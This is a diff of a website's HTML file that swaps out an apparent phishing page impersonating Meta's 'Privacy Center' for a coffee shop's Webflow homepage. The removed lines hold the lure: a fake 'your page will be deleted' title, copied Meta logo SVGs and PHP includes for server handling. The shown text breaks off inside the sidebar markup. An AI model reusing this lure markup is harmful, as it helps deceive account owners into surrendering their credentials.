@@ -1,924 +1,868 @@
 <!DOCTYPE html>
-<html lang="en" id="html">
+<!-- Last Published: Tue Jul 23 2024 21:48:08 GMT+0000 (Coordinated Universal Time) -->
+<html data-wf-domain="danngood.webflow.io" data-wf-page="6610c4fb8d400b1408858d7f" data-wf-site="6610c4fb8d400b1408858d2e" lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:image" content="https://imgur.com/w3cNjri.jpeg">
-    <title>We have scheduled your page to be deleted.</title>
-    <link rel="stylesheet" href="/styles/bootstrap.min.css">
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
-    <link rel="stylesheet" href="/styles/style.css">
-    <link rel="shortcut icon" href="https://i.imgur.com/FOY6xZ9.png" type="image/x-icon">
-
+    <meta charset="utf-8" />
+    <title>Chill Vibes and Dann Good Coffee</title>
+    <meta content="An inspiring space to fuel your ambition and coffee that’s dann good." name="description" />
+    <meta content="Chill Vibes and Dann Good Coffee" property="og:title" />
+    <meta content="An inspiring space to fuel your ambition and coffee that’s dann good." property="og:description" />
+    <meta content="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/66199bccdd906e755c923a54_Dann-Header-01.webp" property="og:image" />
+    <meta content="Chill Vibes and Dann Good Coffee" property="twitter:title" />
+    <meta content="An inspiring space to fuel your ambition and coffee that’s dann good." property="twitter:description" />
+    <meta content="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/66199bccdd906e755c923a54_Dann-Header-01.webp" property="twitter:image" />
+    <meta property="og:type" content="website" />
+    <meta content="summary_large_image" name="twitter:card" />
+    <meta content="width=device-width, initial-scale=1" name="viewport" />
+    <link href="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/css/danngood.webflow.1dd9834bf.min.css" rel="stylesheet" type="text/css" />
+    <script src="https://use.typekit.net/lix6jdf.js" type="text/javascript"></script>
+    <script type="text/javascript">
+        try {
+            Typekit.load();
+        } catch (e) {}
+    </script>
+    <script type="text/javascript">
+        ! function(o, c) {
+            var n = c.documentElement,
+                t = " w-mod-";
+            n.className += t + "js", ("ontouchstart" in o || o.DocumentTouch && c instanceof DocumentTouch) && (n.className += t + "touch")
+        }(window, document);
+    </script>
+    <link href="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619a5d49e0582a34b513366_Dann-Good-Coffee-32.png" rel="shortcut icon" type="image/x-icon" />
+    <link href="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619a5d2f09bbd00a20d1ed6_Dann-Good-Coffee-256.png" rel="apple-touch-icon" />
+    <link href="https://www.danngood.com/" rel="canonical" />
+    <!-- Keep this css code to improve the font quality-->
+    <style>
+        * {
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            -o-font-smoothing: antialiased;
+        }
+    </style>
 </head>
 
-<?php require_once('handle/server-data.php'); ?>
-
 <body>
-
-<?php require_once('intro.php'); ?>
-
-    <div class="container-sm" id="main">
-        <div class="container-head">
-            <div id="logo">
-                <svg aria-label="Логотип Meta" class="x1kpxq89 x1247r65" role="img" viewBox="0 0 500 100">
-                    <defs>
-                        <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH1:" x1="124.38"
-                            x2="160.839" y1="99" y2="59.326">
-                            <stop offset=".427" stop-color="#0278F1"></stop>
-                            <stop offset=".917" stop-color="#0180FA"></stop>
-                        </linearGradient>
-                        <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH2:" x1="42" x2="-1.666"
-                            y1="4.936" y2="61.707">
-                            <stop offset=".427" stop-color="#0165E0"></stop>
-                            <stop offset=".917" stop-color="#0180FA"></stop>
-                        </linearGradient>
-                        <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH3:" x1="27.677"
-                            x2="132.943" y1="28.71" y2="71.118">
-                            <stop stop-color="#0064E0"></stop>
-                            <stop offset=".656" stop-color="#0066E2"></stop>
-                            <stop offset="1" stop-color="#0278F1"></stop>
-                        </linearGradient>
-                    </defs>
-                    <path
-                        d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
-                        fill="#1C2B33"></path>
-                    <path
-                        d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
-                        fill="#0180FA"></path>
-                    <path
-                        d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z"
-                        fill="url(#:R1eckmkldd6knpapd5aqH1:)"></path>
-                    <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z"
-                        fill="url(#:R1eckmkldd6knpapd5aqH2:)"></path>
-                    <path
-                        d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z"
-                        fill="url(#:R1eckmkldd6knpapd5aqH3:)"></path>
-                </svg>
-            </div>
-            <div class="burger-button" id="showPopup">
-                <div class="bar"></div>
-                <div class="bar"></div>
-                <div class="bar"></div>
-            </div>
-        </div>
-        <div class="row">
-
+    <div class="page-wrapper">
+        <div class="global-styles w-embed">
             <style>
-                /* CSS for responsiveness */
-                @media (max-width: 1000px) {
+                /* Set color style to inherit */
 
-                    /* Ẩn phần tử có id="left" */
-                    #left {
-                        display: none;
+                .inherit-color * {
+                    color: inherit;
+                }
+
+                /* Focus state style for keyboard navigation for the focusable elements */
+
+                *[tabindex]:focus-visible,
+                input[type="file"]:focus-visible {
+                    outline: 0.125rem solid #4d65ff;
+                    outline-offset: 0.125rem;
+                }
+
+                /* Get rid of top margin on first element in any rich text element */
+
+                .w-richtext> :not(div):first-child,
+                .w-richtext>div:first-child> :first-child {
+                    margin-top: 0 !important;
+                }
+
+                /* Get rid of bottom margin on last element in any rich text element */
+
+                .w-richtext>:last-child,
+                .w-richtext ol li:last-child,
+                .w-richtext ul li:last-child {
+                    margin-bottom: 0 !important;
+                }
+
+                /* Prevent all click and hover interaction with an element */
+
+                .pointer-events-off {
+                    pointer-events: none;
+                }
+
+                /* Enables all click and hover interaction with an element */
+
+                .pointer-events-on {
+                    pointer-events: auto;
+                }
+
+                /* Create a class of .div-square which maintains a 1:1 dimension of a div */
+
+                .div-square::after {
+                    content: "";
+                    display: block;
+                    padding-bottom: 100%;
+                }
+
+                /* Make sure containers never lose their center alignment */
+
+                .container-medium,
+                .container-small,
+                .container-large {
+                    margin-right: auto !important;
+                    margin-left: auto !important;
+                }
+
+                /* 
+Make the following elements inherit typography styles from the parent and not have hardcoded values. 
+Important: You will not be able to style for example "All Links" in Designer with this CSS applied.
+Uncomment this CSS to use it in the project. Leave this message for future hand-off.
+*/
+
+                /*
+a,
+.w-input,
+.w-select,
+.w-tab-link,
+.w-nav-link,
+.w-dropdown-btn,
+.w-dropdown-toggle,
+.w-dropdown-link {
+  color: inherit;
+  text-decoration: inherit;
+  font-size: inherit;
+}
+*/
+
+                /* Apply "..." after 3 lines of text */
+
+                .text-style-3lines {
+                    display: -webkit-box;
+                    overflow: hidden;
+                    -webkit-line-clamp: 3;
+                    -webkit-box-orient: vertical;
+                }
+
+                /* Apply "..." after 2 lines of text */
+
+                .text-style-2lines {
+                    display: -webkit-box;
+                    overflow: hidden;
+                    -webkit-line-clamp: 2;
+                    -webkit-box-orient: vertical;
+                }
+
+                /* Adds inline flex display */
+
+                .display-inlineflex {
+                    display: inline-flex;
+                }
+
+                /* These classes are never overwritten */
+
+                .hide {
+                    display: none !important;
+                }
+
+                @media screen and (max-width: 991px) {
+                    .hide,
+                    .hide-tablet {
+                        display: none !important;
+                    }
+                }
+
+                @media screen and (max-width: 767px) {
+                    .hide-mobile-landscape {
+                        display: none !important;
+                    }
+                }
+
+                @media screen and (max-width: 479px) {
+                    .hide-mobile {
+                        display: none !important;
+                    }
+                }
+
+                .margin-0 {
+                    margin: 0rem !important;
+                }
+
+                .padding-0 {
+                    padding: 0rem !important;
+                }
+
+                .spacing-clean {
+                    padding: 0rem !important;
+                    margin: 0rem !important;
+                }
+
+                .margin-top {
+                    margin-right: 0rem !important;
+                    margin-bottom: 0rem !important;
+                    margin-left: 0rem !important;
+                }
+
+                .padding-top {
+                    padding-right: 0rem !important;
+                    padding-bottom: 0rem !important;
+                    padding-left: 0rem !important;
+                }
+
+                .margin-right {
+                    margin-top: 0rem !important;
+                    margin-bottom: 0rem !important;
+                    margin-left: 0rem !important;
+                }
+
+                .padding-right {
+                    padding-top: 0rem !important;
+                    padding-bottom: 0rem !important;
+                    padding-left: 0rem !important;
+                }
+
+                .margin-bottom {
+                    margin-top: 0rem !important;
+                    margin-right: 0rem !important;
+                    margin-left: 0rem !important;
+                }
+
+                .padding-bottom {
+                    padding-top: 0rem !important;
+                    padding-right: 0rem !important;
+                    padding-left: 0rem !important;
+                }
+
+                .margin-left {
+                    margin-top: 0rem !important;
+                    margin-right: 0rem !important;
+                    margin-bottom: 0rem !important;
+                }
+
+                .padding-left {
+                    padding-top: 0rem !important;
+                    padding-right: 0rem !important;
+                    padding-bottom: 0rem !important;
+                }
+
+                .margin-horizontal {
+                    margin-top: 0rem !important;
+                    margin-bottom: 0rem !important;
+                }
+
+                .padding-horizontal {
+                    padding-top: 0rem !important;
+                    padding-bottom: 0rem !important;
+                }
+
+                .margin-vertical {
+                    margin-right: 0rem !important;
+                    margin-left: 0rem !important;
+                }
+
+                .padding-vertical {
+                    padding-right: 0rem !important;
+                    padding-left: 0rem !important;
+                }
+
+                /* Apply "..." at 100% width */
+
+                .truncate-width {
+                    width: 100%;
+                    white-space: nowrap;
+                    overflow: hidden;
+                    text-overflow: ellipsis;
+                }
+
+                /* Removes native scrollbar */
+
+                .no-scrollbar {
+                    -ms-overflow-style: none;
+                    overflow: -moz-scrollbars-none;
+                }
+
+                .no-scrollbar::-webkit-scrollbar {
+                    display: none;
+                }
+
+                ::selection {
+                    background: rgba(192, 101, 34, .7);
+                }
+
+                html {
+                    font-size: calc(0.5rem + 0.41666666666666663vw);
+                }
+
+                @media screen and (max-width:1920px) {
+                    html {
+                        font-size: calc(0.49999999999999994rem + 0.41666666666666674vw);
+                    }
+                }
+
+                @media screen and (max-width:1440px) {
+                    html {
+                        font-size: 0.875rem;
+                    }
+                }
+
+                @media screen and (max-width:479px) {
+                    html {
+                        font-size: 1rem;
                     }
                 }
             </style>
-
-            <div class="col-4">
-                <div id="left">
-                    <div id="logo">
-                        <svg aria-label="Логотип Meta" class="" role="img" viewBox="0 0 500 100">
-                            <defs>
-                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH1:" x1="124.38"
-                                    x2="160.838" y1="99" y2="59.326">
-                                    <stop offset=".427" stop-color="#0278F1"></stop>
-                                    <stop offset=".917" stop-color="#0180FA"></stop>
-                                </linearGradient>
-                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH2:" x1="42"
-                                    x2="-1.666" y1="4.936" y2="61.707">
-                                    <stop offset=".427" stop-color="#0165E0"></stop>
-                                    <stop offset=".917" stop-color="#0180FA"></stop>
-                                </linearGradient>
-                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH3:" x1="27.677"
-                                    x2="132.943" y1="28.71" y2="71.118">
-                                    <stop stop-color="#0064E0"></stop>
-                                    <stop offset=".656" stop-color="#0066E2"></stop>
-                                    <stop offset="1" stop-color="#0278F1"></stop>
-                                </linearGradient>
-                            </defs>
-                            <path
-                                d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
-                                fill="#1C2B33"></path>
-                            <path
-                                d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
-                                fill="#0180FA"></path>
-                            <path
-                                d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z"
-                                fill="url(#:R1eckmkldd6knpapd5aqH1:)"></path>
-                            <path
-                                d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z"
-                                fill="url(#:R1eckmkldd6knpapd5aqH2:)"></path>
-                            <path
-                                d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z"
-                                fill="url(#:R1eckmkldd6knpapd5aqH3:)"></path>
-                        </svg>
-                    </div>
-                    <h1>Privacy Center</h1>
-                    <div id="action-buttons">
-
-                        <div class="action-button account" id="utm-user" style="display: none;">
-                            <div class="action-button-img">
-                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
-                                    version="1.1" width="256" height="256" viewBox="0 0 256 256" xml:space="preserve">
-
-                                    <defs>
-                                    </defs>
-                                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;"
-                                        transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
-                                        <path
-                                            d="M 45 88 c -11.049 0 -21.18 -2.003 -29.021 -8.634 C 6.212 71.105 0 58.764 0 45 C 0 20.187 20.187 0 45 0 c 24.813 0 45 20.187 45 45 c 0 13.765 -6.212 26.105 -15.979 34.366 C 66.181 85.998 56.049 88 45 88 z"
-                                            style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(214,214,214); fill-rule: nonzero; opacity: 1;"
-                                            transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
-                                        <path
-                                            d="M 45 60.71 c -11.479 0 -20.818 -9.339 -20.818 -20.817 c 0 -11.479 9.339 -20.818 20.818 -20.818 c 11.479 0 20.817 9.339 20.817 20.818 C 65.817 51.371 56.479 60.71 45 60.71 z"
-                                            style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(165,164,164); fill-rule: nonzero; opacity: 1;"
-                                            transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
-                                        <path
-                                            d="M 45 90 c -10.613 0 -20.922 -3.773 -29.028 -10.625 c -0.648 -0.548 -0.88 -1.444 -0.579 -2.237 C 20.034 64.919 31.933 56.71 45 56.71 s 24.966 8.209 29.607 20.428 c 0.301 0.793 0.069 1.689 -0.579 2.237 C 65.922 86.227 55.613 90 45 90 z"
-                                            style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(165,164,164); fill-rule: nonzero; opacity: 1;"
-                                            transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
-                                    </g>
-                                </svg>
-                            </div>
-                            <div class="action-button-text UserName">
-                            </div>
-                            <div class="action-button-arrow">
-
-                            </div>
-                        </div>
-                        <div class="action-button main collapsed">
-                            <div class="action-button-img">
-                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
-                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
-                                    <path fill-rule="evenodd" clip-rule="evenodd"
-                                        d="m19.007 9.997-6.338-5.704a1 1 0 0 0-1.338 0L4.993 9.997A3 3 0 0 0 4 12.227v6.61c0 .216.07.38.149.48a.432.432 0 0 0 .284.167c.86.14 2.04.29 3.567.391V16a3 3 0 0 1 3-3h2a3 3 0 0 1 3 3v3.875a37.895 37.895 0 0 0 3.567-.39.432.432 0 0 0 .284-.168.773.773 0 0 0 .149-.48v-6.61a3 3 0 0 0-.993-2.23zM3.655 8.51l6.338-5.704a3 3 0 0 1 4.014 0l6.338 5.704A5 5 0 0 1 22 12.227v6.61c0 1.292-.836 2.413-2.11 2.621-.94.153-2.208.312-3.833.418-1.125.073-2.057-.836-2.057-1.964V16a1 1 0 0 0-1-1h-2a1 1 0 0 0-1 1v3.912c0 1.128-.932 2.037-2.057 1.964a40.092 40.092 0 0 1-3.832-.418C2.836 21.25 2 20.13 2 18.838v-6.611A5 5 0 0 1 3.655 8.51z">
-                                    </path>
-                                </svg>
-                            </div>
-                            <div class="action-button-text">
-                                Privacy Center Home Page
-                            </div>
-                            <div class="action-button-arrow">
-
-                            </div>
-                        </div>
-
-                        <div class="action-button collapsed" id="search">
-                            <div class="action-button-img">
-                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
-                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
-                                    <path fill-rule="evenodd" clip-rule="evenodd"
-                                        d="M16.618 18.032a9 9 0 1 1 1.414-1.414l3.675 3.675a1 1 0 0 1-1.414 1.414l-3.675-3.675zM18 11a7 7 0 1 1-14 0 7 7 0 0 1 14 0z">
-                                    </path>
-                                </svg>
-                            </div>
-                            <div class="action-button-text">
-                                Search
-                            </div>
-                        </div>
-
-                        <div class="action-button collapsed" id="Policy" data-bs-toggle="collapse"
-                            data-bs-target="#PolicyCollapse" aria-expanded="false" aria-controls="PolicyCollapse">
-                            <div class="action-button-img">
-                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
-                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
-                                    <path d="M12 12a2 2 0 0 1 1 3.732V17a1 1 0 1 1-2 0v-1.268A2 2 0 0 1 12 12z"></path>
-                                    <path fill-rule="evenodd" clip-rule="evenodd"
-                                        d="M7 6a5 5 0 0 1 10 0v2h.857c1.282 0 2.417.818 2.664 2.076A25.71 25.71 0 0 1 21 15a25.71 25.71 0 0 1-.479 4.924C20.274 21.182 19.14 22 17.857 22H6.143c-1.282 0-2.417-.818-2.664-2.076A25.711 25.711 0 0 1 3 15c0-1.984.236-3.692.479-4.924C3.726 8.818 4.86 8 6.143 8H7V6zm8 0v2H9V6a3 3 0 1 1 6 0zm-8.857 4h11.714a.84.84 0 0 1 .508.157c.107.082.17.182.194.305.223 1.133.441 2.71.441 4.538 0 1.828-.218 3.405-.441 4.538a.488.488 0 0 1-.194.305.84.84 0 0 1-.508.157H6.143a.84.84 0 0 1-.508-.157.489.489 0 0 1-.194-.305A23.712 23.712 0 0 1 5 15c0-1.828.218-3.405.441-4.538a.489.489 0 0 1 .194-.305.84.84 0 0 1 .508-.157z">
-                                    </path>
-                                </svg>
-                            </div>
-                            <div class="action-button-text">
-                                Privacy Policy
-                            </div>
-                            <div class="action-button-arrow">
-                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
-                                    class="ARROW">
-                                    <path fill-rule="evenodd" clip-rule="evenodd"
-                                        d="M4.341 7.247a1 1 0 0 1 1.412.095L12 14.482l6.247-7.14a1 1 0 0 1 1.506 1.317l-7 8a1 1 0 0 1-1.506 0l-7-8a1 1 0 0 1 .095-1.412z">
-                                    </path>
-                                </svg>
-                            </div>
-                        </div>
-
-                        <div class="collapse " id="PolicyCollapse">
-                        </div>
-
-                        <div class="action-button collapsed" data-bs-toggle="collapse" data-bs-target="#RulesCollapse"
-                            aria-expanded="false" aria-controls="RulesCollapse">
-                            <div class="action-button-img">
-                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
-                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
-                                    <path fill-rule="evenodd" clip-rule="evenodd"
-                                        d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm0 2c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm0-13.702c.483 0 .875.391.875.875V17a.875.875 0 0 1-1.75 0v-6.827c0-.484.392-.875.875-.875zm0-1.275c.833 0 1.25-.405 1.25-1.012C13.25 6.405 12.833 6 12 6s-1.25.405-1.25 1.011c0 .607.417 1.012 1.25 1.012z">
-                                    </path>
-                                </svg>
-                            </div>
-                            <div class="action-button-text">
-                                Other rules and articles
-                            </div>
-                            <div class="action-button-arrow">
-                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
-                                    class="ARROW">
-                                    <path fill-rule="evenodd" clip-rule="evenodd"
-                                        d="M4.341 7.247a1 1 0 0 1 1.412.095L12 14.482l6.247-7.14a1 1 0 0 1 1.506 1.317l-7 8a1 1 0 0 1-1.506 0l-7-8a1 1 0 0 1 .095-1.412z">
-                                    </path>
-                                </svg>
-                            </div>
-                        </div>
-                        <div class="collapse" id="RulesCollapse">
-                        </div>
-
-                        <div class="action-button collapsed" data-bs-toggle="collapse" data-bs-target="#SettingCollapse"
-                            aria-expanded="false" aria-controls="SettingCollapse">
-                            <div class="action-button-img">
-                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
-                                    class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
-                                    <path fill-rule="evenodd" clip-rule="evenodd"
-                                        d="M16 12a4 4 0 1 1-8 0 4 4 0 0 1 8 0zm-2 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0z">
-                                    </path>
-                                    <path fill-rule="evenodd" clip-rule="evenodd"
